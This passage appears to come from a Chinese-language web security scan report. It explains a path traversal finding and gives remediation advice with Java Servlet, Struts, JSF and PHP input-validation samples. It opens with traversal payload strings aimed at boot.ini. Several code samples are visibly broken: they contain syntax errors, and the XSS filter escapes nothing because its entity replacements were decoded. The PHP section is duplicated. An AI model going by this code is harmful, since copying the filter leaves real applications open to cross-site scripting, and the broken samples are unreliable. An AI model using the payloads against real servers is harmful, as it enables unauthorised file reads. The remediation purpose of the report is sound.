</div><div>如此一來，當應用程式將表單提交回伺服器時，會向攻擊者提供 boot.ini 檔。</div><div>附註：這項攻擊有可能改為利用 "\"，或與 "/" 交換，以形成變式。</div><div>因此，可能使用 ../../../../../boot.ini, ..\..\..\..\..\boot.ini 和 ..\../../..\../boot.ini。</div></ul></div><div class="noPageBreak" xmlns=""><h4>受影響的產品：</h4><ul style="&#xA;							list-style: none; padding-left: 0; margin-top:0;&#xA;						"><div>這個問題可能會影響不同類型的產品。</div></ul></div><div class="noPageBreak" xmlns=""><h4>修正建議：</h4><h5>一般</h5><ul style="&#xA;              list-style: none; padding-left: 0; margin-top:0;&#xA;            "><div>[1] 確定要求的檔案在 Web 伺服器的虛擬路徑中。</div><div>[2] 確定只能開啟特定副檔名</div><div>[3] 從使用者輸入中移除特殊字元（meta 字元），例如：垂直線 ("|") 字元。</div><div>[4] 在 Perl CGI Script 中，檔案使用「明確開啟」模式。</div><div>ASP.NET 提供了一些先驗證檔名再開啟檔案的方法。例如：</div><div></div><div>[1] Server.MapPath() 方法：這個方法會接收一個路徑（字串），再將指定的相對或虛擬路徑對映到伺服器上相對應的實體目錄。</div><div>附註：AspEnableParentPaths 內容（Metabase 內容）的預設值是 FALSE，以確保 Script 不會有應用程式根目錄以外的檔案存取權。</div><div>將這個內容值改成 TRUE 會構成潛在的安全風險。</div><div></div><div>[2] Path.GetFileName() 方法：這個方法會有效移除給定檔案路徑的最後一個元素，傳回由檔案路徑中最後一個分隔字元之前的所有字元所組成的字串（不包括最後一個分隔字元）。</div><div></div><div>附註：如果這個方法的引數包括如下 'InvalidPathChars'，便會發出 'ArgumentException'：</div><div>a. 引號 (")</div><div>b. 小於 (&lt;)</div><div>c. 大於 (&gt;)</div><div>d. 垂直線 (|)</div><div>e. 倒退鍵 (\b)</div><div>f. 空值 (\0)</div><div>g. Unicode 字元 16 至 18 和 20 至 25。</div><div></div><div>基於安全考量，我們建議您先使用 Server.MapPath() 方法，再執行檔名的任何輸入驗證。</div><div>** 檔案路徑驗證：</div><div></div><div>您可以利用多種方法從「Servlet 儲存器」存取檔案系統。</div><div>不過，部分方法有危險，因為它們支援在 Web 根目錄之外存取檔案。給定虛擬路徑在伺服器的文件樹狀結構中，有兩種安全的 Servlet API 方法可用來存取 Web 資源。</div><div>當給定檔名解析為在 Web 根目錄之外的值時，這些 API 會傳回空值。應該利用下列 API 來存取儲存在 Web 根目錄之下的配置檔或其他檔案：</div><div></div><div>[1] ServletContext.getResource（或 ServletContext.getResourceAsStream）</div><div>[2] ServletContext.getRealPath</div><div></div><div>[1] ServletContext.getResource（或 ServletContext.getResourceAsStream）</div><div>ServletContext.getResource 或 ServletContext.getResourceAsStream 可用來存取位於虛擬路徑（相對於伺服器的 Web 根目錄）的資源。</div><div>資源可以在本端或遠端檔案系統上，在資料庫中，或在 .war 檔中。</div><div></div><div>ServletContext.getResource 會傳回對映至指定路徑之資源的 URL。如果沒有資源對映至指定的路徑，它會傳回空值。如果指定路徑的形式不正確，它會擲出 MalFormedURLException。</div><div></div><div>ServletContext.getResourceAsStream 會傳回對映至指定路徑之資源的 InputStream 物件。如果沒有有效資源對映至指定的路徑，它會傳回空值。</div><div></div><div>下列範例說明如何載入在應用程式 WEB-INF 目錄中，名稱為 servlet.xml 的 Servlet 配置檔：</div><div></div><div>  // Example to load the /WEB-INF/servlet.xml configuration file
  URL url = getServletContext().getResource("/WEB-INF/servlet.xml");
  // Acquire an input stream to the config resource
  InputStream configInput = url.openStream();
  ...
</div><div></div><div>另外，您也可以依照下列範例所說明，利用 ServletContext.getResourceAsStream 方法來直接獲得配置檔的輸入串流：</div><div></div><div>  // Example to acquire an input stream to a resource
  InputStream configInput = getServletContext().getResourceAsStream("/WEB-INF/servlet.xml");
  ...
</div><div></div><div>[2] ServletContext.getRealPath</div><div>給定資源的虛擬路徑（相對於伺服器的 Web 根目錄），這個方法會傳回資源的真實路徑。</div><div>真實路徑以執行 Servlet 儲存器的電腦和作業系統所適用的形式傳回，其中包括適當的路徑分隔字元。</div><div></div><div>這個方法的通行程度低於 ServletContext.getResource（或 ServletContext.getResourceAsStream），因為它不允許存取未儲存在本端檔案的資源。如果 Servlet 儲存器為了任何原因（例如：從 .war 保存檔啟用內容），無法將虛擬路徑轉換成真實路徑，它會傳回空值。</div><div></div><div>請注意，Servlet 引擎負責實作 ServletContext.getRealPath 方法。在所有 Servlet 引擎中，這項實作有可能不一致或不正確。請一律依照下列範例所說明來驗證傳回的路徑：</div><div></div><div>  // Example to access a resource using ServletContext.getRealPath
  // Get the virtual path parameter from the http request
  String virtualPath = request.getParameter("virtual_path");
  String realPath = getServletContext().getRealPath(virtualPath);
  if (realPath != null) {
      // verify that realPath is valid
      File file = new File(realPath);
      if (!file.exists()) {
          // oops, invalid path
  ...
      }
  }
</div><div></div><div>建議的 Java 工具</div><div>N/A.</div><div></div><div>參照</div><a href="https://www.programcreek.com/java-api-examples/?class=javax.servlet.ServletContext&amp;method=getResource">https://www.programcreek.com/java-api-examples/?class=javax.servlet.ServletContext&amp;method=getResource</a><br /><a href="https://www.programcreek.com/java-api-examples/?class=javax.servlet.ServletContext&amp;method=getResourceAsStream">https://www.programcreek.com/java-api-examples/?class=javax.servlet.ServletContext&amp;method=getResourceAsStream</a><br /><a href="https://www.programcreek.com/java-api-examples/?class=javax.servlet.ServletContext&amp;method=getRealPath">https://www.programcreek.com/java-api-examples/?class=javax.servlet.ServletContext&amp;method=getRealPath</a><br /><div>**驗證輸入資料：</div><div></div><div>雖然為了使用者的方便，可以在用戶端層提供資料驗證，但必須利用 Servlet，在伺服器層執行資料驗證。</div><div>用戶端驗證原本就不安全，因為它們可以輕易略過，例如：停用 JavaScript。</div><div></div><div>好的設計通常需要 Web 應用程式架構提供伺服器端公用程式常式來驗證下列項目：</div><div>[1] 必要欄位</div><div>[2] 欄位資料類型（依預設，所有 HTTP 要求參數都是 String）</div><div>[3] 欄位長度</div><div>[4] 欄位範圍</div><div>[5] 欄位選項</div><div>[6] 欄位型樣</div><div>[7] Cookie 值</div><div>[8] HTTP 回應</div><div></div><div>在實務中，好的做法是在 "Validator" 公用程式類別中將上述常式當作靜態方法來實作。下列各節說明範例驗證器類別</div><div></div><div>[1] 必要欄位</div><div>一律檢查確認欄位不是空值，欄位長度大於零，且不含在前端及尾端的空格。</div><div></div><div>如何驗證必要欄位的範例：</div><div>  // Java example to validate required fields
  public Class Validator {
  ...
      public static boolean validateRequired(String value) {
          boolean isFieldValid = false;
          if (value != null &amp;&amp; value.trim().length() &gt; 0) {
              isFieldValid = true;
          }
          return isFieldValid;
      }
  ...
  }
  ...
  String fieldValue = request.getParameter("fieldName");
  if (Validator.validateRequired(fieldValue)) {
      // fieldValue is valid, continue processing request
  ...
  }
</div><div></div><div>[2] 欄位資料類型</div><div>在 Web 應用程式中，所輸入的輸入參數設定不良。例如，所有 HTTP 要求參數或 Cookie 值都是 String 類型。開發人員負責確認輸入的資料類型正確。</div><div>請利用 Java 基本封套類別來檢查欄位值是否能安全轉換成所需要的基本資料類型。</div><div></div><div>如何驗證數值欄位（int 類型）的範例：</div><div></div><div>  // Java example to validate that a field is an int number
  public Class Validator {
  ...
      public static boolean validateInt(String value) {
          boolean isFieldValid = false;
          try {
              Integer.parseInt(value);
              isFieldValid = true;
          } catch (Exception e) {
              isFieldValid = false;
          }
          return isFieldValid;
      }
  ...
  }
  ...
  // check if the HTTP request parameter is of type int
  String fieldValue = request.getParameter("fieldName");
  if (Validator.validateInt(fieldValue)) {
      // fieldValue is valid, continue processing request
  ...
  }
</div><div></div><div>在實務中，好的做法是將所有 HTTP 要求參數轉換成它們的相關資料類型。請將要求參數的 "integerValue" 儲存在要求屬性中，再依照下列範例所示來使用它：</div><div></div><div>  // Example to convert the HTTP request parameter to a primitive wrapper data type
  // and store this value in a request attribute for further processing
  String fieldValue = request.getParameter("fieldName");
  if (Validator.validateInt(fieldValue)) {
      // convert fieldValue to an Integer
      Integer integerValue = Integer.getInteger(fieldValue);
      // store integerValue in a request attribute
      request.setAttribute("fieldName", integerValue);
  }
  ...
  // Use the request attribute for further processing
  Integer integerValue = (Integer)request.getAttribute("fieldName");
  ...
</div><div></div><div>應用程式應該處理的主要 Java 資料類型：</div><div>- Byte</div><div>- Short</div><div>- Integer</div><div>- Long</div><div>- Float</div><div>- Double</div><div>- Date</div><div></div><div>[3] 欄位長度</div><div>一律確定輸入參數（HTTP 要求參數或 Cookie 值）在長度下限及/或長度上限的範圍內。</div><div></div><div>驗證 userName 欄位的長度是否在 8-20 個字元之間的範例：</div><div></div><div>  // Example to validate the field length
  public Class Validator {
  ...
      public static boolean validateLength(String value, int minLength, int maxLength) {
          String validatedValue = value;
          if (!validateRequired(value)) {
              validatedValue = "";
          }
          return (validatedValue.length() &gt;= minLength &amp;&amp;
                      validatedValue.length() &lt;= maxLength);
      }
  ...
  }
  ...
  String userName = request.getParameter("userName");
  if (Validator.validateRequired(userName)) {
      if (Validator.validateLength(userName, 8, 20)) {
          // userName is valid, continue further processing
  ...
      }
  }
</div><div></div><div>[4] 欄位範圍</div><div>一律確定輸入參數在函數需求定義的範圍內。</div><div></div><div>驗證輸入 numberOfChoices 是否在 10-20 之間的範例：</div><div></div><div>  // Example to validate the field range
  public Class Validator {
  ...
      public static boolean validateRange(int value, int min, int max) {
          return (value &gt;= min &amp;&amp; value &lt;= max);
      }
  ...
  }
  ...
  String fieldValue = request.getParameter("numberOfChoices");
  if (Validator.validateRequired(fieldValue)) {
      if (Validator.validateInt(fieldValue)) {
          int numberOfChoices = Integer.parseInt(fieldValue);
          if (Validator.validateRange(numberOfChoices, 10, 20)) {
              // numberOfChoices is valid, continue processing request
  ...
          }
      }
  }
</div><div></div><div>[5] 欄位選項</div><div>Web 應用程式通常會向使用者呈現一組可供選擇的選項（例如：使用 SELECT HTML 標籤），但無法執行伺服器端驗證來確保所選的值是容許的選項之一。請記住，惡意的使用者可以輕易修改任何選項值。請一律對照函數需求所定義容許的選項來驗證所選的使用者值。</div><div></div><div>對照容許的選項清單來驗證使用者選項的範例：</div><div></div><div>  // Example to validate user selection against a list of options
  public Class Validator {
  ...
      public static boolean validateOption(Object[] options, Object value) {
          boolean isValidValue = false;
          try {
              List list = Arrays.asList(options);
              if (list != null) {
                  isValidValue = list.contains(value);
              }
          } catch (Exception e) {
          }
          return isValidValue;
      }
  ...
  }
  ...
  // Allowed options
  String[] options = {"option1", "option2", "option3");
  // Verify that the user selection is one of the allowed options
  String userSelection = request.getParameter("userSelection");
  if (Validator.validateOption(options, userSelection)) {
      // valid user selection, continue processing request
  ...
  }
</div><div></div><div>[6] 欄位型樣</div><div>一律檢查使用者輸入是否符合功能需求所定義的型樣。比方說，如果 userName 欄位只應接受英數字元，且不區分大小寫，請使用下列正規表示式：^[a-zA-Z0-9]*$</div><div></div><div>Java 1.3 或更早的版本不包括任何正規表示式套件。建議搭配 Java 1.3 來使用「Apache 正規表示式套件」（請參閱下列「資源」），以解決這項支援欠缺。執行正規表示式驗證的範例：</div><div></div><div>  // Example to validate that a given value matches a specified pattern
  // using the Apache regular expression package
  import org.apache.regexp.RE;
  import org.apache.regexp.RESyntaxException;
  public Class Validator {
  ...
      public static boolean matchPattern(String value, String expression) {
          boolean match = false;
          if (validateRequired(expression)) {
               RE r = new RE(expression);
               match = r.match(value);             
          }
          return match;
      }
  ...
  }
  ...
  // Verify that the userName request parameter is alpha-numeric
  String userName = request.getParameter("userName");
  if (Validator.matchPattern(userName, "^[a-zA-Z0-9]*$")) {
      // userName is valid, continue processing request
  ...
  }
</div><div></div><div>Java 1.4 引進了新的正規表示式套件 (java.util.regex)。以下是 Validator.matchPattern 的修正版，使用新的 Java 1.4 正規表示式套件：</div><div></div><div>  // Example to validate that a given value matches a specified pattern
  // using the Java 1.4 regular expression package
  import java.util.regex.Pattern;
  import java.util.regexe.Matcher;
  public Class Validator {
  ...
      public static boolean matchPattern(String value, String expression) {
          boolean match = false;
          if (validateRequired(expression)) {
              match = Pattern.matches(expression, value);
          }
          return match;
      }
  ...
  }
</div><div></div><div>[7] Cookie 值</div><div>請利用 javax.servlet.http.Cookie 物件來驗證 Cookie 值。依應用程式需求而定，相同的驗證規則（說明如上）也適用於 Cookie 值，例如：驗證必要的值、驗證長度，等等。</div><div></div><div>驗證必要 Cookie 值的範例：</div><div></div><div>  // Example to validate a required cookie value
  // First retrieve all available cookies submitted in the HTTP request
  Cookie[] cookies = request.getCookies();
  if (cookies != null) {
      // find the "user" cookie
      for (int i=0; i&lt;cookies.length; ++i) {
          if (cookies[i].getName().equals("user")) {
              // validate the cookie value
              if (Validator.validateRequired(cookies[i].getValue()) {
                  // valid cookie value, continue processing request
  ...
              }
          }    
      }
  }
</div><div></div><div>[8] HTTP 回應</div><div>[8-1] 過濾使用者輸入</div><div>如果要保護應用程式免於遭受跨網站指令碼，請將機密字元轉換成對應的字元實體來消毒 HTML。以下是 HTML 區分字元：</div><div>&lt; &gt; " ' % ; ) ( &amp; +</div><div></div><div>將機密字元轉換成對應的字元實體來過濾指定字串的範例：</div><div></div><div>  // Example to filter sensitive data to prevent cross-site scripting
  public Class Validator {
  ...
      public static String filter(String value) {
          if (value == null) {
              return null;
          }        
          StringBuffer result = new StringBuffer(value.length());
          for (int i=0; i&lt;value.length(); ++i) {
              switch (value.charAt(i)) {
              case '&lt;':
                  result.append("&lt;");
                  break;
              case '&gt;': 
                  result.append("&gt;");
                  break;
              case '"': 
                  result.append(""");
                  break;
              case '\'': 
                  result.append("'");
                  break;
              case '%': 
                  result.append("%");
                  break;
              case ';': 
                  result.append(";");
                  break;
              case '(': 
                  result.append("(");
                  break;
              case ')': 
                  result.append(")");
                  break;
              case '&amp;': 
                  result.append("&amp;");
                  break;
              case '+':
                  result.append("+");
                  break;
              default:
                  result.append(value.charAt(i));
                  break;
          }        
          return result;
      }
  ...
  }
  ...
  // Filter the HTTP response using Validator.filter
  PrintWriter out = response.getWriter();
  // set output response
  out.write(Validator.filter(response));
  out.close();
</div><div></div><div>Java Servlet API 2.3 引進了「過濾器」，它支援截取及轉換 HTTP 要求或回應。</div><div></div><div>利用「Servlet 過濾器」，以 Validator.filter 來消毒回應的範例：</div><div></div><div>  // Example to filter all sensitive characters in the HTTP response using a Java Filter.
  // This example is for illustration purposes since it will filter all content in the response, including HTML tags!
  public class SensitiveCharsFilter implements Filter {
  ...
      public void doFilter(ServletRequest request,
                      ServletResponse response,
                      FilterChain chain)
              throws IOException, ServletException {
  
          PrintWriter out = response.getWriter();
          ResponseWrapper wrapper = new ResponseWrapper((HttpServletResponse)response);
          chain.doFilter(request, wrapper);
  
          CharArrayWriter caw = new CharArrayWriter();
          caw.write(Validator.filter(wrapper.toString()));
          
          response.setContentType("text/html");
          response.setContentLength(caw.toString().length());
          out.write(caw.toString());
          out.close();
      }
  ...
      public class CharResponseWrapper extends HttpServletResponseWrapper {
          private CharArrayWriter output;
  
          public String toString() {
              return output.toString();
          }
      
          public CharResponseWrapper(HttpServletResponse response){
              super(response);
              output = new CharArrayWriter();
          }
          
          public PrintWriter getWriter(){
              return new PrintWriter(output);
          }
      }
  } 
  
  }
</div><div></div><div>[8-2] 維護 Cookie 安全</div><div>當機密資料儲存在 Cookie 中，請務必利用 Cookie.setSecure（布林旗標），在 HTTP 回應中設定 Cookie 的安全旗標，以指示瀏覽器利用 HTTPS 或 SSL 之類的安全通訊協定來傳送 Cookie。</div><div></div><div>維護 "user" Cookie 安全的範例：</div><div></div><div>  // Example to secure a cookie, i.e. instruct the browser to
  // send the cookie using a secure protocol
  Cookie cookie = new Cookie("user", "sensitive");
  cookie.setSecure(true);
  response.addCookie(cookie);
</div><div></div><div>建議的 Java 工具</div><div>適用於伺服器端驗證的兩個主要的 Java 架構如下：</div><div>[1] Jakarta 一般驗證器（整合 Struts 1.1）</div><div>「Jakarta 一般驗證器」實作上述所有資料驗證需求，是一個功能強大的架構。這些規則配置在定義表單欄位輸入驗證規則的 XML 檔中。依預設，Struts 支援在利用 Struts 'bean:write' 標籤撰寫的所有資料上，過濾 [8] HTTP 回應中輸出的危險字元。設定 'filter=false' 旗標可以停用這個過濾。</div><div></div><div>Struts 定義下列基本輸入驗證器，但也可以定義自訂驗證器：</div><div>required：如果欄位含有空格以外的任何字元，便告成功。</div><div>mask：如果值符合 mask 屬性給定的正規表示式，便告成功。</div><div>range：如果值在 min 和 max 屬性給定的值範圍內（(value &gt;= min) 且 (value &lt;= max)），便告成功。</div><div>maxLength：如果欄位長度小於或等於 max 屬性，便告成功。</div><div>minLength：如果欄位長度大於或等於 min 屬性，便告成功。</div><div>byte、short、integer、long、float、double：如果值可以轉換成對應的基本類型，便告成功。</div><div>date：如果值代表有效日期，便告成功。可提供日期型樣。</div><div>creditCard：如果值可能是有效的信用卡號碼，便告成功。</div><div>e-mail：如果值可能是有效的電子郵件位址，便告成功。</div><div></div><div>利用「Struts 驗證器」驗證 loginForm 之 userName 欄位的範例：</div><div>  &lt;form-validation&gt;
      &lt;global&gt;
  ...
          &lt;validator name="required"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateRequired"
              msg="errors.required"&gt;
          &lt;/validator&gt;
          &lt;validator name="mask"
              classname="org.apache.struts.validator.FieldChecks"
              method="validateMask"
              msg="errors.invalid"&gt;
          &lt;/validator&gt;
  ...
      &lt;/global&gt;
      &lt;formset&gt;
          &lt;form name="loginForm"&gt;
              &lt;!-- userName is required and is alpha-numeric case insensitive --&gt;
              &lt;field property="userName" depends="required,mask"&gt;
                  &lt;!-- message resource key to display if validation fails --&gt;
                  &lt;msg name="mask" key="login.userName.maskmsg"/&gt;
                  &lt;arg0 key="login.userName.displayname"/&gt;
                  &lt;var&gt;
                      &lt;var-name&gt;mask&lt;/var-name&gt;
                      &lt;var-value&gt;^[a-zA-Z0-9]*$&lt;/var-value&gt;
                  &lt;/var&gt;
              &lt;/field&gt;
  ...
          &lt;/form&gt;
  ...
      &lt;/formset&gt;
  &lt;/form-validation&gt;
</div><div></div><div>[2] JavaServer Faces 技術</div><div>「JavaServer Faces 技術」是一組代表使用者介面元件、管理元件狀態、處理事件及驗證輸入的 Java API (JSR 127)。</div><div></div><div>JavaServer Faces API 實作下列基本驗證器，但可以定義自訂驗證器：</div><div>validate_doublerange：登錄元件的 DoubleRangeValidator。</div><div>validate_length：登錄元件的 LengthValidator。</div><div>validate_longrange：登錄元件的 LongRangeValidator。</div><div>validate_required：登錄元件的 RequiredValidator。</div><div>validate_stringrange：登錄元件的 StringRangeValidator。</div><div>validator：登錄元件的自訂 Validator。</div><div></div><div>JavaServer Faces API 定義下列 UIInput 和 UIOutput 展現器（標籤）：</div><div>input_date：接受以 java.text.Date 實例格式化的 java.util.Date。</div><div>output_date：顯示以 java.text.Date 實例格式化的 java.util.Date。</div><div>input_datetime：接受以 java.text.Time 實例格式化的 java.util.Date。</div><div>output_datetime：顯示以 java.text.Time 實例格式化的 java.util.Date。</div><div>input_number：顯示以 java.text.NumberFormat 格式化的數值資料類型（java.lang.Number 或基本資料類型）。</div><div>output_number：顯示以 java.text.NumberFormat 格式化的數值資料類型（java.lang.Number 或基本資料類型）。</div><div>input_text：接受單行字串。</div><div>output_text：顯示單行字串。</div><div>input_time：接受以 java.text.DateFormat 時間實例格式化的 java.util.Date。</div><div>output_time：顯示以 java.text.DateFormat 時間實例格式化的 java.util.Date。</div><div>input_hidden：可讓頁面作者將隱藏變數併入頁面。</div><div>input_secret：接受不含空格的單行文字，並在輸入時，將它顯示成一組星號。</div><div>input_textarea：接受多行文字。</div><div>output_errors：顯示整個頁面的錯誤訊息，或指定之用戶端 ID 的相關錯誤訊息。</div><div>output_label：將巢狀元件顯示為指定輸入欄位的標籤。</div><div>output_message：顯示本地化訊息。</div><div></div><div>利用 JavaServer Faces 驗證 loginForm 之 userName 欄位的範例：</div><div>  &lt;%@ taglib uri="https://docs.oracle.com/javaee/6/tutorial/doc/glxce.html" prefix="h" %&gt;
  &lt;%@ taglib uri="http://mrbool.com/how-to-create-a-login-validation-with-jsf-java-server-faces/27046" prefix="f" %&gt;
  ...
  &lt;jsp:useBean id="UserBean"
      class="myApplication.UserBean" scope="session" /&gt;
  &lt;f:use_faces&gt;
    &lt;h:form formName="loginForm" &gt;
      &lt;h:input_text id="userName" size="20" modelReference="UserBean.userName"&gt;
          &lt;f:validate_required/&gt;
          &lt;f:validate_length minimum="8" maximum="20"/&gt;    
      &lt;/h:input_text&gt;
      &lt;!-- display errors if present --&gt;
      &lt;h:output_errors id="loginErrors" clientId="userName"/&gt;
      &lt;h:command_button id="submit" label="Submit" commandName="submit" /&gt;&lt;p&gt;
    &lt;/h:form&gt;
  &lt;/f:use_faces&gt;
</div><div></div><div></div><div>參照</div><div>Java API 1.3 - </div><a href="https://www.oracle.com/java/technologies/java-archive-13docs-downloads.html">https://www.oracle.com/java/technologies/java-archive-13docs-downloads.html</a><br /><div>Java API 1.4 - </div><a href="https://www.oracle.com/java/technologies/java-archive-142docs-downloads.html">https://www.oracle.com/java/technologies/java-archive-142docs-downloads.html</a><br /><div>Java Servlet API 2.3 - </div><a href="https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api">https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api</a><br /><div>Java 正規表示式套件 - </div><a href="http://jakarta.apache.org/regexp/">http://jakarta.apache.org/regexp/</a><br /><div>Jakarta 驗證器 - </div><a href="http://jakarta.apache.org/commons/validator/">http://jakarta.apache.org/commons/validator/</a><br /><div>JavaServer Faces 技術 - </div><a href="http://www.javaserverfaces.org/">http://www.javaserverfaces.org/</a><br /><div>** 檔案路徑驗證：</div><div></div><div>PHP 提供了一些先驗證檔名再開啟檔案的方法。例如：</div><div></div><div>[1] file_exists() 方法：這個方法檢查檔案或目錄是否存在。如果檔案或目錄存在，它會傳回 True，否則，傳回 False。</div><div></div><div>  &lt;?php
      $filename = '/path/to/foo.txt';
      if (file_exists($filename)) 
      {
          echo "The file $filename exists";
      } 
      else 
      {
          echo "The file $filename does not exist";
      }
  ?&gt;
</div><div></div><div>[2] is_file() 方法：這個方法指出檔名是否為一般檔案，若是，便傳回 True。</div><div></div><div>  &lt;?php
      $filename = '/path/to/foo.txt';
      if (is_file($filename)) 
      {
          echo "The file $filename is a regular file";
      } 
      else 
      {
          echo "There is a problem with the file: $filename";
      }
  ?&gt;
</div><div></div><div>[3] 當執行含有使用者輸入的檔案作業時，您應該一律檢查指定的檔名和路徑是否符合特定限制。具體地說，您應該確定只允許在預定的目錄樹狀結構內執行檔案作業。檢查給定的路徑名稱是否開始於所要的目錄名稱並不足夠， 因為攻擊者可以利用路徑遍訪攻擊來欺騙應用程式，讓它在所要的目錄之外提供檔案；比方說，利用 "../../../../"（附註：這個字串也可以用許多不同形式來編碼，以略過字串相符演算法）。</div><div></div><div>以下是試圖驗證使用者提供的檔名時，可能會有用的兩個 PHP 函數：</div><div></div><div>realpath() - 傳回標準化絕對路徑名稱</div><div>basename() - 傳回路徑的檔名元件</div><div></div><div>參照</div><div></div><div>[1] PHP 手冊 - realpath(): </div><a href="http://www.php.net/realpath">http://www.php.net/realpath</a><br /><div>[2] PHP 手冊 - basename(): </div><a href="http://www.php.net/basename">http://www.php.net/basename</a><br /><div>[3] PHP 手冊 - file_exists(): </div><a href="http://www.php.net/file_exists">http://www.php.net/file_exists</a><br /><div>[4] PHP 手冊 - is_file(): </div><a href="http://www.php.net/is_file**">http://www.php.net/is_file**</a><br /><div>檔案路徑驗證：</div><div></div><div>PHP 提供了一些先驗證檔名再開啟檔案的方法。例如：</div><div></div><div>[1] file_exists() 方法：這個方法檢查檔案或目錄是否存在。如果檔案或目錄存在，它會傳回 True，否則，傳回 False。</div><div></div><div>  &lt;?php
      $filename = '/path/to/foo.txt';
      if (file_exists($filename)) 
      {
          echo "The file $filename exists";
      } 
      else 
      {
          echo "The file $filename does not exist";
      }
  ?&gt;
</div><div></div><div>[2] is_file() 方法：這個方法指出檔名是否為一般檔案，若是，便傳回 True。</div><div></div><div>  &lt;?php
      $filename = '/path/to/foo.txt';
      if (is_file($filename)) 
      {
          echo "The file $filename is a regular file";
      } 
      else 
      {
          echo "There is a problem with the file: $filename";
      }
  ?&gt;
</div><div></div><div>[3] 當執行含有使用者輸入的檔案作業時，您應該一律檢查指定的檔名和路徑是否符合特定限制。具體地說，您應該確定只允許在預定的目錄樹狀結構內執行檔案作業。檢查給定的路徑名稱是否開始於所要的目錄名稱並不足夠， 因為攻擊者可以利用路徑遍訪攻擊來欺騙應用程式，讓它在所要的目錄之外提供檔案；比方說，利用 "../../../../"（附註：這個字串也可以用許多不同形式來編碼，以略過字串相符演算法）。</div><div></div><div>以下是試圖驗證使用者提供的檔名時，可能會有用的兩個 PHP 函數：</div><div></div><div>realpath() - 傳回標準化絕對路徑名稱</div><div>basename() - 傳回路徑的檔名元件</div><div></div><div>參照</div><div></div><div>[1] PHP 手冊 - realpath(): </div><a href="http://www.php.net/realpath">http://www.php.net/realpath</a><br /><div>[2] PHP 手冊 - basename(): </div><a href="http://www.php.net/basename">http://www.php.net/basename</a><br /><div>[3] PHP 手冊 - file_exists(): </div><a href="http://www.php.net/file_exists">http://www.php.net/file_exists</a><br /><div>[4] PHP 手冊 - is_file(): </div><a href="http://www.php.net/is_file">http://www.php.net/is_file</a><br /><div></div><div></div><div>** 驗證輸入資料：</div><div></div><div>雖然為了使用者的方便，可以在用戶端層提供資料驗證，但一律必須在伺服器層執行資料驗證。用戶端驗證原本就不安全，因為它們可以輕易略過，例如：停用 JavaScript。</div><div></div><div>好的設計通常需要 Web 應用程式架構提供伺服器端公用程式常式來驗證下列項目：</div><div>[1] 必要欄位</div><div>[2] 欄位資料類型（依預設，所有 HTTP 要求參數都是 String）</div><div>[3] 欄位長度</div><div>[4] 欄位範圍</div><div>[5] 欄位選項</div><div>[6] 欄位型樣</div><div>[7] Cookie 值</div><div>[8] HTTP 回應</div><div></div><div>在實務中，好的做法是實作一或多個驗證各個應用程式參數的函數。下列各節說明一些檢查範例。</div><div></div><div>[1] 必要欄位</div><div>一律檢查確認欄位不是空值，欄位長度大於零，且不含在前端及尾端的空格。</div><div>如何驗證必要欄位的範例：</div><div>  // PHP example to validate required fields
  function validateRequired($input) {
      ...
      $pass = false;
      if (strlen(trim($input))&gt;0){
          $pass = true;
      }
      return $pass;
      ...
  }
  ...
  if (validateRequired($fieldName)) {
      // fieldName is valid, continue processing request
      ...
  }
</div><div></div><div></div><div>[2] 欄位資料類型</div><div>在 Web 應用程式中，所輸入的輸入參數設定不良。例如，所有 HTTP 要求參數或 Cookie 值都是 String 類型。開發人員負責確認輸入的資料類型正確。</div><div></div><div>[3] 欄位長度</div><div>一律確定輸入參數（HTTP 要求參數或 Cookie 值）在長度下限及/或長度上限的範圍內。</div><div></div><div>[4] 欄位範圍</div><div>一律確定輸入參數在函數需求定義的範圍內。</div><div></div><div>[5] 欄位選項</div><div>Web 應用程式通常會向使用者呈現一組可供選擇的選項（例如：使用 SELECT HTML 標籤），但無法執行伺服器端驗證來確保所選的值是容許的選項之一。請記住，惡意的使用者可以輕易修改任何選項值。請一律對照函數需求所定義容許的選項來驗證所選的使用者值。</div><div></div><div>[6] 欄位型樣</div><div>一律檢查使用者輸入是否符合功能需求所定義的型樣。比方說，如果 userName 欄位只應接受英數字元，且不區分大小寫，請使用下列正規表示式：</div><div>^[a-zA-Z0-9]+$</div><div></div><div>[7] Cookie 值</div><div>依應用程式需求而定，相同的驗證規則（說明如上）也適用於 Cookie 值，例如：驗證必要的值、驗證長度，等等。</div><div></div><div>[8] HTTP 回應</div><div></div><div>[8-1] 過濾使用者輸入</div><div>如果要保護應用程式免於遭受跨網站指令碼，開發人員應該將機密字元轉換成對應的字元實體來消毒 HTML。以下是 HTML 區分字元：</div><div>&lt; &gt; " ' % ; ) ( &amp; +</div><div></div><div>PHP 包括一些 htmlentities() 之類的自動化消毒公用程式函數：</div><div></div><div>  $input = htmlentities($input, ENT_QUOTES, 'UTF-8');
</div><div></div><div>此外，為了避免「跨網站指令碼」的 UTF-7 變式，您應該明確定義回應的 Content-Type 標頭，例如：</div><div></div><div>  &lt;?php
  
  header('Content-Type: text/html; charset=UTF-8');
  
  ?&gt;
</div><div></div><div>[8-2] 維護 Cookie 安全</div><div></div><div>當機密資料儲存在 Cookie 中，且透過 SSL 來傳輸它時，請務必先在 HTTP 回應中設定 Cookie 的安全旗標。這會指示瀏覽器只透過 SSL 連線來使用這個 Cookie。</div><div></div><div>您可以利用下列程式碼範例來維護 Cookie 安全：</div><div></div><div>  &lt;$php
  
      $value = "some_value";
      $time = time()+3600;
      $path = "/application/";
      $domain = ".example.com";
      $secure = 1;
  
      setcookie("CookieName", $value, $time, $path, $domain, $secure, TRUE);
  ?&gt;
  
